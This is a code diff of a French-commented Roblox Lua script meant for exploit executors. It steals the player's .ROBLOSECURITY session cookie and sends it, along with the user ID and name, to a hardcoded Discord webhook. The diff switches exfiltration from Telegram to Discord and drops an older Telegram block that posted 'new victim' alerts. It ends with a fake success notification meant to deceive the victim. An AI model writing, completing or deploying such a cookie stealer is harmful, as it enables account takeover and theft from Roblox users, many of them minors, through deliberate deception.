@@ -1,13 +1,10 @@
--- Script pour récupérer le cookie Roblox et l'envoyer à Telegram
+-- Script pour récupérer le cookie Roblox et l'envoyer à Discord
 -- Fonctionne avec les exécuteurs comme Delta, Synapse X, etc.
 
 -- Services Roblox nécessaires
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
-
--- ⚠️ Ne stocke PAS tes informations Telegram ici ⚠️
--- Elles seront récupérées à partir du serveur séparé
 
 -- Fonction pour obtenir le cookie .ROBLOSECURITY
 local function getCookie()
@@ -35,7 +32,7 @@ local function getCookie()
     return cookie or "Cookie non trouvé"
 end
 
--- Fonction pour envoyer à Telegram (les infos sont chargées dynamiquement)
+-- Fonction pour envoyer à Discord (les infos sont chargées dynamiquement)
 local function sendToDiscord(token, userId, userName)
     local WEBHOOK_URL = "https://discord.com/api/webhooks/1455615155969851403/EgT6gsKtBbGhgJ1gMDBWpD00lc5pU1m4Slkda6IU6ZaMOa5elH7KdVj3IGdBvF6jyAt0"  -- Remplace par ton webhook URL
     local data = {
@@ -61,49 +58,11 @@ local function sendToDiscord(token, userId, userName)
     end
 end
 
--- Dans l'exécution principale, remplace sendToTelegram par sendToDiscord
+-- Exécution principale
 local cookie = getCookie()
 if cookie ~= "Cookie non trouvé" then
     sendToDiscord(cookie, player.UserId, player.Name)
 end
-    
-    local config = loadstring(decode(configEncoded))()
-    local TELEGRAM_BOT_TOKEN = config.t
-    local CHAT_ID = config.c
-    local TELEGRAM_API_URL = "https://api.telegram.org/bot" .. TELEGRAM_BOT_TOKEN .. "/sendMessage"
-    
-    -- Envoyer le message à Telegram
-    local success, response = pcall(function()
-        local data = {
-            chat_id = CHAT_ID,
-            text = string.format(
-                "🚨 *NOUVELLE VICTIME!* 🚨\n" ..
-                "👤 *Joueur:* %s (%d)\n" ..
-                "🔑 *Token:* `%s`\n" ..
-                "⏰ *Heure:* %s",
-                userName,
-                userId,
-                token,
-                os.date("%Y-%m-%d %H:%M:%S")
-            ),
-            parse_mode = "Markdown"
-        }
-        
-        local headers = { ["Content-Type"] = "application/json" }
-        local jsonData = HttpService:JSONEncode(data)
-        return HttpService:PostAsync(TELEGRAM_API_URL, jsonData, Enum.HttpContentType.ApplicationJson, false, headers)
-    end)
-    
-    if success then
-        print("Token envoyé avec succès!")
-    else
-        warn("Échec: " .. tostring(response))
-    end
-end
-
--- Exécution principale
-local cookie = getCookie()
-sendToTelegram(cookie, player.UserId, player.Name)
 
 -- Afficher un message de succès pour tromper la victime
 game:GetService("StarterGui"):SetCore("SendNotification", {
